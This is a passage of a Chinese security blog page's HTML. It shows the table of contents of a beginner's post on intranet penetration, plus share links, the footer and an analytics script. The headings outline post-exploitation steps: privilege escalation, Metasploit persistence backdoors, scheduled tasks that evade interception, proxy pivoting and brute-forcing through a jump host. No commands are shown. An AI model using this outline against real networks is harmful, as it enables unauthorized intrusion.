class="toc-text">拿到shell后的两个方向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#如果是低权限的机器，就提权："><span class="toc-number">2.2.1.</span> <span class="toc-text">如果是低权限的机器，就提权：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一些其他的办法："><span class="toc-number">2.2.2.</span> <span class="toc-text">一些其他的办法：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后门"><span class="toc-number">2.3.</span> <span class="toc-text">后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Msf的持续后门："><span class="toc-number">2.3.1.</span> <span class="toc-text">Msf的持续后门：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Msf自动运行脚本"><span class="toc-number">2.3.2.</span> <span class="toc-text">Msf自动运行脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用persistence和autorunscript留后门的方法是："><span class="toc-number">2.3.3.</span> <span class="toc-text">使用persistence和autorunscript留后门的方法是：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过拦截的计划任务："><span class="toc-number">2.3.4.</span> <span class="toc-text">绕过拦截的计划任务：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#网络分析"><span class="toc-number">3.</span> <span class="toc-text">网络分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看本机网络信息"><span class="toc-number">3.1.</span> <span class="toc-text">查看本机网络信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用代理探测内网"><span class="toc-number">3.2.</span> <span class="toc-text">使用代理探测内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#正向代理：Regeorg-proxychains-（win下用proxycap）"><span class="toc-number">3.2.1.</span> <span class="toc-text">正向代理：Regeorg + proxychains （win下用proxycap）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反向代理：路由表-socks4a-proxychains"><span class="toc-number">3.2.2.</span> <span class="toc-text">反向代理：路由表+socks4a+proxychains</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proxychains-不支持ICMP协议，nmap要加-sT-和-Pn-参数。"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">Proxychains 不支持ICMP协议，nmap要加-sT 和 -Pn 参数。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用nmap探测内网服务"><span class="toc-number">3.2.3.</span> <span class="toc-text">使用nmap探测内网服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过跳板对内网爆破"><span class="toc-number">3.2.4.</span> <span class="toc-text">通过跳板对内网爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过跳板转发端口"><span class="toc-number">3.2.5.</span> <span class="toc-text">通过跳板转发端口</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#关注的两个点："><span class="toc-number">3.2.5.1.</span> <span class="toc-text">关注的两个点：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#分析网络"><span class="toc-number">4.</span> <span class="toc-text">分析网络</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#参考文章："><span class="toc-number">4.0.0.1.</span> <span class="toc-text">参考文章：</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&text=0基础内网渗透思路整理与工具使用"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&title=0基础内网渗透思路整理与工具使用"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&is_video=false&description=0基础内网渗透思路整理与工具使用"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=0基础内网渗透思路整理与工具使用&body=Check out this article: http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&title=0基础内网渗透思路整理与工具使用"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&title=0基础内网渗透思路整理与工具使用"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&title=0基础内网渗透思路整理与工具使用"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&title=0基础内网渗透思路整理与工具使用"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&name=0基础内网渗透思路整理与工具使用&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 Homaebic-Know thyself
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/friends/">Friendly link</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
